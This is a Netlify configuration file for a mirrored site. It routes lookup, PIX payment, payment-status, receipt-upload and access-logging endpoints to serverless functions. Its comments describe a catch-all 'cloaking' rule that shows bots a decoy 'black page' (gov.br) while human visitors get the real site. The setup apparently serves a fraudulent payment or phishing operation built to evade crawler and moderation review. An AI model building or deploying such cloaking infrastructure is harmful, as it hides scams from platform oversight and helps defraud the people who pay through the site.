[build]
  publish = "site-mirror"
  functions = "netlify/functions"

[functions]
  node_bundler = "esbuild"

[functions."pix-api"]
  external_node_modules = ["pg"]

# Cloaking: bots get a "black page" (gov.br), humans get the real site.
# NOTE: specific routes below must stay above the catch-all /* cloak rule.
[[redirects]]
  from = "/api/consulta.php"
  to = "/.netlify/functions/consulta"
  status = 200

[[redirects]]
  from = "/api/payment/payment.php"
  to = "/.netlify/functions/pix-api"
  status = 200

[[redirects]]
  from = "/api/payment/payment_second.php"
  to = "/.netlify/functions/pix-api"
  status = 200

[[redirects]]
  from = "/api/payment/payment_fixo.php"
  to = "/.netlify/functions/pix-api"
  status = 200

[[redirects]]
  from = "/api/payment/status/status.php"
  to = "/.netlify/functions/pix-api"
  status = 200

[[redirects]]
  from = "/api/notify-approved"
  to = "/.netlify/functions/pix-api"
  status = 200

[[redirects]]
  from = "/api/webhooks/blackcat"
  to = "/.netlify/functions/pix-api"
  status = 200

[[redirects]]
  from = "/api/comprovantes/upload.php"
  to = "/.netlify/functions/pix-api"
  status = 200

[[redirects]]
  from = "/api/transaction/*"
  to = "/.netlify/functions/pix-api"
  status = 200

[[redirects]]
  from = "/api/log-access"
  to = "/.netlify/functions/pix-api"
  status = 200

[[redirects]]
  from = "/login"
  to = "/login.html"
  status = 200

# Cloaking catch-all: bots get a "black page" (gov.br), humans get the real site.
[[redirects]]
  from = "/"
  to = "/.netlify/functions/cloak"
  status = 200

[[redirects]]
  from = "/*"
  to = "/.netlify/functions/cloak"
  status = 200